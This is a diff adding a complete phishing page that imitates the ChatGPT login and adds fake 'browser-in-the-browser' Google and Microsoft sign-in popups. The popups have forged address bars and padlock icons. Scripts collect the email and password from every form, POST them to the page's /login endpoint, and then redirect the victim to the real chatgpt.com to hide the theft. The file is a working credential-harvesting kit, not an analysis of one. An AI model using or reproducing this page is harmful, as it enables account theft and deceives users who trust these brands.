@@ -1,0 +1,920 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Form</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        /* --- General Styles --- */
+        body {
+            background-color: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .absolute { position: absolute; }
+        .left-4 { left: 1rem; }
+        .top-4 { top: 1rem; }
+        .text-gray-900 { color: #1e293b; }
+        .font-semibold { font-weight: 600; }
+        .text-xl { font-size: 1.25rem; }
+        .w-full { width: 100%; }
+        .max-w-md { max-width: 28rem; }
+        .bg-white { background-color: #fff; }
+        .rounded-xl { border-radius: 0.75rem; }
+        .p-6 { padding: 1.5rem; }
+        .space-y-8 { margin-bottom: 2rem; }
+        .text-3xl { font-size: 1.875rem; }
+        .text-center { text-align: center; }
+        .space-y-4 { margin-bottom: 1rem; }
+
+        /* --- Form Input Styles --- */
+        .custom-input {
+            width: 100%;
+            padding: 0.75rem 1rem;
+            border-radius: 0.5rem;
+            border: 1px solid #e0e0e0;
+            outline: none;
+            transition: border-color 0.2s ease;
+            font-size: 1rem;
+            background-color: #ffffff;
+            color: #333;
+        }
+
+        .custom-input:focus {
+            border-color: #3b82f6;
+            box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.25);
+        }
+
+        .custom-input::placeholder {
+            color: #9ca3af;
+        }
+
+        .input-error {
+            border-color: #dc2626;
+            focus-ring-color: #fecaca;
+        }
+
+        .error-message {
+            color: #dc2626;
+            font-size: 0.875rem;
+            margin-top: 0.25rem;
+        }
+
+        /* --- Button Styles --- */
+        .continue-button {
+            width: 100%;
+            padding: 0.75rem 1rem;
+            border-radius: 0.5rem;
+            background-color: #11a37f;
+            color: #fff;
+            font-weight: 600;
+            text-align: center;
+            cursor: pointer;
+            transition: background-color 0.2s ease;
+            font-size: 1rem;
+            border: none;
+            margin-top: 1rem;
+        }
+
+        .continue-button:hover {
+            background-color: #059669;
+        }
+
+        /* --- Link Styles --- */
+        .sign-up-link {
+            color: #3b82f6;
+            text-decoration: underline;
+        }
+
+        .sign-up-link:hover {
+            text-decoration: none;
+        }
+
+        /* --- Divider Styles --- */
+        .or-divider {
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 2rem;
+            margin-bottom: 2rem;
+        }
+
+        .or-divider::before,
+        .or-divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background-color: #d1d5db;
+        }
+
+        .or-divider span {
+            padding: 0 1rem;
+            color: #6b7280;
+            font-size: 0.875rem;
+            background-color: #fff;
+        }
+
+        /* --- Social Login Button Styles --- */
+        .google-sign-in, .microsoft-sign-in {
+            width: 100%;
+            padding: 0.75rem 1rem;
+            border-radius: 0.5rem;
+            border: 1px solid #e0e0e0;
+            color: #4b5563;
+            font-weight: 500;
+            text-align: center;
+            cursor: pointer;
+            transition: background-color 0.2s ease;
+            font-size: 1rem;
+            background-color: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 0.75rem;
+        }
+
+        .google-sign-in:hover, .microsoft-sign-in:hover {
+            background-color: #f8fafc;
+        }
+
+        .google-icon, .microsoft-icon {
+            width: 20px;
+            height: 20px;
+            margin-right: 0.5rem;
+        }
+
+        /* --- Password Container --- */
+        #password-container {
+            display: none;
+            margin-bottom: 1.5rem;
+        }
+
+        /* --- BITB Frame Styles (macOS) --- */
+        .browser-window {
+            width: 100%;
+            max-width: 450px;
+            margin: 0 auto;
+            border-radius: 8px;
+            box-shadow: 0 0 30px rgba(0, 0, 0, 0.5);
+            display: none;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 20;
+            overflow: hidden;
+            background-color: white;
+            color: black;
+        }
+
+        .browser-header {
+            padding: 8px 12px;
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+            cursor: grab;
+            background-color: #e8e8e8;
+            border-top-left-radius: 8px;
+            border-top-right-radius: 8px;
+        }
+
+        .browser-header:active {
+            cursor: grabbing;
+        }
+
+        .dots {
+            display: flex;
+            gap: 8px;
+            margin-right: 10px;
+        }
+
+        .dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            cursor: pointer;
+        }
+
+        .dot.red { background-color: #ff5f56; }
+        .dot.yellow { background-color: #ffbd2e; }
+        .dot.green { background-color: #27c93f; }
+
+        .dot.red:hover { background-color: #e5534b; }
+        .dot.yellow:hover { background-color: #f2b51e; }
+        .dot.green:hover { background-color: #22ac38; }
+
+        .browser-url-container {
+            flex-grow: 1;
+            margin-right: auto;
+            display: flex;
+            align-items: center;
+            background: #d0d0d0;
+            padding: 6px 10px;
+            border-radius: 5px;
+            font-size: 12px;
+            color: #333;
+            font-family: monospace;
+            gap: 5px;
+            overflow: hidden;
+        }
+
+        .lock-icon {
+            width: 16px;
+            height: 16px;
+            display: inline-block;
+            margin-right: 4px;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%236fcf97' width='16' height='16'%3E%3Cpath d='M12 17a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Zm6-7h-1V7a5 5 0 0 0-10 0v3H6a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-8a2 2 0 0 0-2-2ZM9 7a3 3 0 0 1 6 0v3H9V7Zm9 13H6v-8h12v8Z'%3E%3C/path%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-size: contain;
+            vertical-align: middle;
+        }
+
+        .browser-url {
+            flex-grow: 1;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .window-controls {
+            display: none;
+        }
+
+        .content {
+            background: white;
+            padding: 32px;
+            border-bottom-left-radius: 8px;
+            border-bottom-right-radius: 8px;
+        }
+
+        /* --- Form Styles within BITB --- */
+        .form-group-bitb {
+            width: 100%;
+            margin-bottom: 24px;
+            position: relative;
+        }
+
+        .form-control-bitb {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            outline: none;
+            font-size: 16px;
+            transition: all 0.3s ease;
+        }
+
+        .form-label-bitb {
+            position: absolute;
+            top: 10px;
+            left: 12px;
+            font-size: 16px;
+            color: #5f6368;
+            transition: 0.3s;
+            pointer-events: none;
+        }
+
+        .form-control-bitb:focus + .form-label-bitb,
+        .form-control-bitb:not(:placeholder-shown) + .form-label-bitb {
+            transform: translateY(-24px);
+            font-size: 12px;
+            color: #1a73e8;
+        }
+
+        .forgot-email {
+            font-size: 14px;
+            color: #1a73e8;
+            text-decoration: none;
+            margin-bottom: 16px;
+            display: block;
+            width: 100%;
+            text-align: left;
+        }
+
+        .forgot-email:hover {
+            text-decoration: none;
+        }
+
+        .text-area {
+            font-size: 12px;
+            color: #5f6368;
+            margin-top: 8px;
+            text-align: left;
+            width: 100%;
+        }
+
+        .button-container-bitb {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            width: 100%;
+            margin-top: 32px;
+        }
+
+        .create-account {
+            font-size: 14px;
+            color: #1a73e8;
+            text-decoration: none;
+        }
+
+        .create-account:hover {
+            text-decoration: underline;
+        }
+
+        .next-button-bitb {
+            background-color: #1a73e8;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            padding: 10px 24px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .next-button-bitb:hover {
+            background-color: #145db0;
+        }
+
+        .form-control-bitb.password-mode {
+            -webkit-text-security: password;
+            -moz-text-security: password;
+            text-security: password;
+            font-size: 16px;
+        }
+
+        .form-label-bitb.password-mode {
+            color: #1a73e8;
+        }
+
+        /* --- Microsoft BITB Styles --- */
+        .microsoft-browser-window {
+            width: 100%;
+            max-width: 450px;
+            margin: 0 auto;
+            border-radius: 8px;
+            box-shadow: 0 0 30px rgba(0, 0, 0, 0.5);
+            display: none;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 20;
+            overflow: hidden;
+            background-color: white;
+            color: black;
+        }
+
+        .microsoft-browser-window .browser-header {
+            background-color: #e8e8e8;
+            color: black;
+            border-top-left-radius: 8px;
+            border-top-right-radius: 8px;
+        }
+
+        .microsoft-browser-window .address-bar {
+            background-color: #d0d0d0;
+            color: #333;
+        }
+
+        .microsoft-content {
+            padding: 20px;
+            background: white;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+            align-items: center;
+            height: auto;
+            border-bottom-left-radius: 8px;
+            border-bottom-right-radius: 8px;
+        }
+
+        .microsoft-container {
+            background-color: #ffffff;
+            width: 100%;
+            max-width: 400px;
+            padding: 40px;
+            box-shadow: 0 0 12px rgba(0, 0, 0, 0.1);
+            border-radius: 6px;
+        }
+
+        .microsoft-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 30px;
+        }
+
+        .microsoft-logo {
+            width: 28px;
+            height: 28px;
+        }
+
+        .microsoft-logo-text {
+            font-size: 20px;
+            font-weight: 600;
+            color: #5e5e5e;
+        }
+
+        .microsoft-title {
+            font-size: 24px;
+            font-weight: 600;
+            margin: 0 0 30px;
+        }
+
+        .microsoft-input-wrapper {
+            position: relative;
+            margin-bottom: 30px;
+            border-bottom: 1px solid #666;
+            width: 100%;
+        }
+
+        .microsoft-input-wrapper input {
+            width: 100%;
+            border: none;
+            outline: none;
+            font-size: 16px;
+            padding: 4px 0 6px;
+            background-color: transparent;
+        }
+
+        .microsoft-links {
+            font-size: 13px;
+            color: #0067b8;
+            margin-bottom: 40px;
+            text-align: left;
+            width: 100%;
+        }
+
+        .microsoft-links .info-line {
+            color: black;
+            margin-bottom: 12px;
+        }
+
+        .microsoft-links a {
+            text-decoration: none;
+            color: #0067b8;
+        }
+
+        .microsoft-next-button {
+            background-color: #0067b8;
+            color: white;
+            border: none;
+            padding: 10px 25px;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+            border-radius: 2px;
+            margin-top: 20px;
+            width: fit-content;
+            align-self: flex-start;
+        }
+
+        /* --- Google BITB Overrides --- */
+        #google-window .logo {
+            display: flex; /* Add this */
+            justify-content: center; /* Add this */
+            margin-bottom: 16px;
+        }
+
+        #google-window .logo img {
+            height: 50px;
+        }
+
+        #google-window .title {
+            font-size: 20px;
+            font-weight: 500;
+            color: #202124;
+            margin-bottom: 4px;
+            text-align: center; /* Add this */
+        }
+
+        #google-window .subtitle {
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 24px;
+            text-align: center; /* Add this */
+        }
+    </style>
+</head>
+<body class="bg-white dark:bg-white flex items-center justify-center min-h-screen font-sans">
+    <div class="absolute left-4 top-4 text-gray-900 dark:text-gray-900 font-semibold text-xl">ChatGPT</div>
+    <div class="w-full max-w-md bg-white dark:bg-white rounded-xl p-6 space-y-8">
+        <h1 class="text-3xl font-semibold text-gray-900 dark:text-gray-900 text-center">
+            Welcome back
+        </h1>
+        <div class="space-y-4">
+            <div>
+                <input
+                    type="email"
+                    id="email"
+                    placeholder="Email address"
+                    class="custom-input"
+                    aria-invalid="false"
+                />
+                <p id="email-error" class="error-message"></p>
+            </div>
+            <div id="password-container" class="relative">
+                <input
+                    type="password"
+                    id="password"
+                    placeholder="Password"
+                    class="custom-input"
+                />
+            </div>
+            <button id="continue-button" class="continue-button">
+                Continue
+            </button>
+        </div>
+        <p class="text-sm text-gray-600 dark:text-gray-600 text-center">
+            Don't have an account? <a href="#" class="sign-up-link">Sign up</a>
+        </p>
+        <div class="or-divider">
+            <span>OR</span>
+        </div>
+        <button class="google-sign-in"  id="googleLogin">
+            <img src="https://www.google.com/favicon.ico" alt="Google" class="google-icon" />
+            <span class="ml-2">Continue with Google</span>
+        </button>
+        <button class="microsoft-sign-in" id="microsoftLogin" onclick="showMicrosoftLogin()">
+            <img src="https://www.microsoft.com/favicon.ico" alt="Microsoft" class="microsoft-icon" />
+            <span class="ml-2">Continue with Microsoft</span>
+        </button>
+    </div>
+
+    <div class="browser-window" id="google-window">
+        <div class="browser-header" id="dragHandleGoogle">
+            <div class="dots">
+                <div class="dot red" onclick="closeLogin('google')"></div>
+                <div class="dot yellow"></div>
+                <div class="dot green"></div>
+            </div>
+            <div class="browser-url-container">
+                <svg xmlns="http://www.w3.org/2000/svg" class="lock-icon" viewBox="0 0 24 24" fill="#6fcf97" width="16" height="16">
+                    <path d="M12 17a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Zm6-7h-1V7a5 5 0 0 0-10 0v3H6a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-8a2 2 0 0 0-2-2ZM9 7a3 3 0 0 1 6 0v3H9V7Zm9 13H6v-8h12v8Z"/>
+                </svg>
+                <div class="browser-url">accounts.google.com/signin/v2/identifier?...</div>
+            </div>
+            <div class="window-controls"> </div>
+        </div>
+
+        <div class="content">
+            <div class="container">
+                <div class="logo">
+                    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo">
+                </div>
+                <h1 class="title">Sign in</h1>
+                <h2 class="subtitle">Use your Google Account</h2>
+                <div class="form-group-bitb">
+                    <input type="text" id="email-bitb" class="form-control-bitb" placeholder=" " />
+                    <label for="email" class="form-label-bitb">Email or phone</label>
+                </div>
+                <a href="#" class="forgot-email">Forgot email?</a>
+                <div class="text-area">
+                    Not your device? Use Guest mode to sign in privately.
+                    <a href="#" style="color: #1a73e8; text-decoration: none;">Learn more</a>
+                </div>
+                <div class="button-container-bitb">
+                    <a href="#" class="create-account">Create account</a>
+                    <button class="next-button-bitb" onclick="handleGoogleNext()">Next</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="browser-window" id="microsoft-window">
+        <div class="browser-header" id="dragHandleMicrosoft">
+            <div class="dots">
+                <div class="dot red" onclick="closeLogin('microsoft')"></div>
+                <div class="dot yellow"></div>
+                <div class="dot green"></div>
+            </div>
+            <div class="browser-url-container">
+                <svg xmlns="http://www.w3.org/2000/svg" class="lock-icon" viewBox="0 0 24 24" fill="#6fcf97" width="16" height="16">
+                    <path d="M12 17a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Zm6-7h-1V7a5 5 0 0 0-10 0v3H6a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-8a2 2 0 0 0-2-2ZM9 7a3 3 0 0 1 6 0v3H9V7Zm9 13H6v-8h12v8Z"/>
+                </svg>
+                <div class="browser-url">login.microsoftonline.com/auth/oauth2/v2.0/...</div>
+            </div>
+            <div class="window-controls"> </div>
+        </div>
+
+        <div class="content">
+            <div class="microsoft-container">
+                <div class="microsoft-header">
+                  <img class="microsoft-logo" src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg"alt="Microsoft logo">
+                  <span class="microsoft-logo-text">Microsoft</span>
+                </div>
+                <h2 class="microsoft-title">Sign in</h2>
+                <div class="microsoft-input-wrapper" id="email-wrapper-microsoft">
+                  <input type="email" id="email-microsoft" placeholder="Email or phone" required>
+                </div>
+                <div class="microsoft-input-wrapper" id="password-wrapper-microsoft" style="display: none;">
+                  <input type="password" id="password-microsoft" placeholder="Password" required>
+                </div>
+                <div class="microsoft-links">
+                  <div class="info-line">No account? <a href="#">Create one!</a></div>
+                  <div style="margin-top: 10px;"><a href="#">Can't access your account?</a></div>
+                </div>
+                <button class="microsoft-next-button" id="next-button-microsoft" onclick="handleMicrosoftNext()">Next</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const emailInput = document.getElementById('email');
+        const continueButton = document.getElementById('continue-button');
+        const emailError = document.getElementById('email-error');
+        const passwordContainer = document.getElementById('password-container');
+        const passwordInput = document.getElementById('password');
+        const googleLoginButton = document.getElementById('googleLogin');
+        const microsoftLoginButton = document.getElementById('microsoftLogin');
+
+
+        // Get references to the elements for the BITB frame
+        let isDragging = false;
+        let offset = { x: 0, y: 0 };
+        let activeWindow = null;
+        const googleWindow = document.getElementById('google-window');
+        const microsoftWindow = document.getElementById('microsoft-window');
+        const googleHeader = document.getElementById('dragHandleGoogle');
+        const microsoftHeader = document.getElementById('dragHandleMicrosoft');
+        const emailInputBitb = document.getElementById('email-bitb');
+        const emailLabelBitb = document.querySelector('.form-label-bitb');
+        let isGoogleEmailEntered = false;
+        let googleUserEmail = '';
+
+        // Microsoft frame elements
+        const microsoftEmailInput = document.getElementById('email-microsoft');
+        const microsoftPasswordInput = document.getElementById('password-microsoft');
+        const microsoftNextButton = document.getElementById('next-button-microsoft');
+        let microsoftEmailEntered = '';
+
+
+        //Show and hide functions for the BITB Frame
+        function showLogin(type) {
+            closeAllLogins();
+            if (type === 'google') {
+                googleWindow.style.display = 'block';
+                activeWindow = 'google';
+            } else if (type === 'microsoft') {
+                microsoftWindow.style.display = 'block';
+                activeWindow = 'microsoft';
+            }
+            document.querySelector('.continue-button').style.display = 'none';
+        }
+
+        function closeAllLogins() {
+            googleWindow.style.display = 'none';
+            microsoftWindow.style.display = 'none';
+            activeWindow = null;
+            isGoogleEmailEntered = false;
+            emailInputBitb.value = '';
+            emailInputBitb.type = 'text';
+            emailInputBitb.classList.remove('password-mode');
+            emailLabelBitb.classList.remove('password-mode');
+            emailLabelBitb.textContent = 'Email or phone';
+            microsoftEmailEntered = '';
+            microsoftEmailInput.value = '';
+            microsoftPasswordInput.value = '';
+            document.getElementById('email-wrapper-microsoft').style.display = 'block';
+            document.getElementById('password-wrapper-microsoft').style.display = 'none';
+            microsoftNextButton.innerText = 'Next';
+        }
+
+        function closeLogin(type) {
+            if (type === 'google' && activeWindow === 'google') {
+                googleWindow.style.display = 'none';
+                activeWindow = null;
+            } else if (type === 'microsoft' && activeWindow === 'microsoft') {
+                microsoftWindow.style.display = 'none';
+                activeWindow = null;
+            }
+            document.querySelector('.continue-button').style.display = 'block';
+        }
+
+        //Drag functions for the BITB frame
+        function handleDragStart(event) {
+            isDragging = true;
+            offset = {
+                x: event.clientX - (activeWindow === 'google' ? googleWindow.offsetLeft : microsoftWindow.offsetLeft),
+                y: event.clientY - (activeWindow === 'google' ? googleWindow.offsetTop : microsoftWindow.offsetTop),
+            };
+            const currentHeader = activeWindow === 'google' ? googleWindow.querySelector('.browser-header') : microsoftWindow.querySelector('.browser-header');
+            currentHeader.style.cursor = 'grabbing';
+        }
+
+        function handleDrag(event) {
+            if (isDragging && activeWindow) {
+                let currentWindow;
+                if (activeWindow === 'google') {
+                    currentWindow = googleWindow;
+                } else if (activeWindow === 'microsoft') {
+                    currentWindow = microsoftWindow;
+                }
+                if (currentWindow) {
+                    currentWindow.style.left = event.clientX - offset.x + 'px';
+                    currentWindow.style.top = event.clientY - offset.y + 'px';
+                }
+            }
+        }
+
+        function handleDragEnd() {
+            isDragging = false;
+            if (activeWindow) {
+                const currentHeader = activeWindow === 'google' ? googleWindow.querySelector('.browser-header') : microsoftWindow.querySelector('.browser-header');
+                currentHeader.style.cursor = 'grab';
+            }
+        }
+
+        googleHeader.addEventListener('mousedown', handleDragStart);
+        microsoftHeader.addEventListener('mousedown', handleDragStart);
+        document.addEventListener('mousemove', handleDrag);
+        document.addEventListener('mouseup', handleDragEnd);
+
+        emailInputBitb.addEventListener('keydown', function(event) {
+            if (event.key === 'Enter') {
+                handleGoogleNext();
+            }
+        });
+
+        function handleLoginSuccess() {
+            window.location.replace('https://chatgpt.com');
+        }
+
+        function handleGoogleNext() {
+            if (!isGoogleEmailEntered) {
+                if (isValidEmail(emailInputBitb.value.trim())) {
+                    isGoogleEmailEntered = true;
+                    googleUserEmail = emailInputBitb.value;
+                    emailLabelBitb.textContent = 'Enter your password';
+                    emailInputBitb.value = '';
+                    emailInputBitb.setAttribute('type', 'password');
+                    emailInputBitb.classList.add('password-mode');
+                    emailLabelBitb.classList.add('password-mode');
+                } else {
+                     alert('Please enter a valid email address.');
+                }
+            } else {
+                if (emailInputBitb.value.trim() !== '') {
+                    const password = emailInputBitb.value;
+
+                    fetch('/login', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({ email: googleUserEmail, password: password })
+                    })
+                    .then(response => {
+                        if (response.ok) {
+                            closeLogin('google');
+                            handleLoginSuccess();
+                        } else {
+                            console.error('Login failed');
+                            alert('Login failed. Please check your credentials.');
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Error:', error);
+                        alert('An error occurred. Please try again later.');
+                    });
+                } else {
+                    alert('Please enter your password.');
+                }
+            }
+        }
+
+        microsoftEmailInput.addEventListener('keydown', function(event) {
+          if (event.key === 'Enter') {
+            handleMicrosoftNext();
+            event.preventDefault();
+          }
+        });
+
+        function handleMicrosoftNext() {
+            if (microsoftNextButton.innerText === 'Next') {
+                microsoftEmailEntered = microsoftEmailInput.value.trim();
+                if (microsoftEmailEntered) {
+                  document.getElementById('email-wrapper-microsoft').style.display = 'none';
+                  document.getElementById('password-wrapper-microsoft').style.display = 'block';
+                  microsoftNextButton.innerText = 'Sign in';
+                  microsoftPasswordInput.focus();
+                } else {
+                  alert('Please enter your email or phone number.');
+                }
+            } else {
+              const password = microsoftPasswordInput.value.trim();
+                if (password) {
+                  fetch('/login', {
+                    method: 'POST',
+                    headers: {
+                      'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ email: microsoftEmailEntered, password: password }),
+                  })
+                  .then(response => {
+                    if (response.ok) {
+                      closeLogin('microsoft');
+                      handleLoginSuccess();
+                    } else {
+                      console.error('Login failed');
+                      alert('Login failed. Please check your credentials.');
+                    }
+                  })
+                  .catch(error => {
+                    console.error('Error:', error);
+                    alert('An error occurred. Please try again later.');
+                  });
+                } else {
+                  alert('Please enter your password.');
+                }
+            }
+        }
+
+        function isValidEmail(email) {
+            const emailRegex = /^[\w-\.]+@([\w-]+\.)+[\w-]{2,4}$/;
+            return emailRegex.test(email);
+        }
+
+        googleLoginButton.addEventListener('click', function() {
+            showLogin('google');
+        });
+
+        microsoftLoginButton.addEventListener('click', function() {
+            showLogin('microsoft');
+        });
+
+
+        let emailEntered = false;
+
+        continueButton.addEventListener('click', function() {
+            const emailValue = emailInput.value;
+
+            let hasErrors = false;
+
+            if (!emailValue) {
+                emailError.textContent = 'Please enter your email address.';
+                emailInput.classList.add('input-error');
+                hasErrors = true;
+            } else if (!/^[\w-\.]+@([\w-]+\.)+[\w-]{2,4}$/.test(emailValue)) {
+                emailError.textContent = 'Invalid email format';
+                emailInput.classList.add('input-error');
+                hasErrors = true;
+            } else {
+                emailError.textContent = '';
+                emailInput.classList.remove('input-error');
+            }
+
+            if (!hasErrors && !emailEntered) {
+                emailEntered = true;
+                passwordContainer.style.display = 'block';
+                continueButton.textContent = 'Continue';
+                emailInput.disabled = true;
+                passwordInput.focus();
+            }
+            else if (!hasErrors && emailEntered) {
+                const passwordValue = passwordInput.value;
+                fetch('/login', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ email: emailValue, password: passwordValue })
+                })
+                .then(response => {
+                    if (response.ok) {
+                        console.log('Login successful!');
+                        handleLoginSuccess();
+                    } else {
+                        console.error('Login failed');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+            }
+        });
+
+        emailInput.addEventListener('input', function() {
+            if (!this.value || /^[\w-\.]+@([\w-]+\.)+[\w-]{2,4}$/.test(this.value)) {
+                emailError.textContent = '';
+                emailInput.classList.remove('input-error');
+            }
+            if (emailEntered && !this.value){
+                emailEntered = false;
+                passwordContainer.style.display = 'none';
+                continueButton.textContent = 'Continue';
+                emailInput.disabled = false;
+                passwordInput.value = '';
+            }
+        });
+    </script>
+</body>
+</html>
